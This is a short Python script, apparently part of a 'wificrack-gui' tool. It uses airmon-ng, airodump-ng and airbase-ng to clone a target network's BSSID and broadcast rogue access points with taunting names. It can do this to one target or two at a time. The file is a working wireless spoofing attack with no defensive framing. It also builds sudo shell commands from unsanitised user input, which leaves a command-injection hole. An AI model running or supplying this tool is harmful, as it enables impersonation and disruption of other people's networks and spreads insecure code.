import os
import colorama
from colorama import Fore  
from time import sleep
colorama.init()
# you can change name wifi this:

a = (""" "fuck-wifi" """)
b = (""" "fuck-hacker" """)
c = (""" "hacker-see-you" """)
d = (""" "your-wifi-gonna-die" """)


def change_wifi():
    print(Fore.GREEN+"you can change name wifi default to you want on /opt/wificrack-gui/lib/change-wifi.py"+Fore.RESET)
    os.system("sudo airmon-ng")
    pilih = input("interfaces: ")
    yoi = int(input("choose the number you want 1/2: "))
    if yoi ==1:
        os.system("konsole --hold -e sudo airodump-ng " + pilih + " &") 
        sleep(3.0)
        os.system("clear")
        print("please wait 10 second")
        sleep(10)
        os.system("clear")
        yoss = input("bssid: ")
        chan = input("channel: ")
        os.system("clear")
        os.system("konsole --hold -geometry 900x500 -e sudo airodump-ng " + pilih + " &")
        os.system("clear")
        os.system("sudo airbase-ng -a " + yoss + " --essid " + a + " -c " + chan + " " + pilih)
    elif yoi ==2:
        os.system("konsole --hold -e sudo airodump-ng " + pilih + " &")
        sleep(3.0)
        os.system("clear")
        print("please wait 10 second")
        sleep(10)
        os.system("clear")
        y = input("bssid: ")
        ts = input("channel: ")
        print("ok now new bssid for 2 target")
        br = input("bssid: ")
        yw = input("channel: ")
        os.system("konsole --hold -geometry 900x500 -e sudo airodump-ng " + pilih + " &")
        os.system("sudo airbase-ng -a " + y + " --essid " + a + " -c " + ts + " " + pilih + " &")
        os.system("xterm -hold -bg black -fg red -e sudo airbase-ng -a " + br + " --essid " + b + " -c " + yw + " " + pilih)
        
change_wifi()
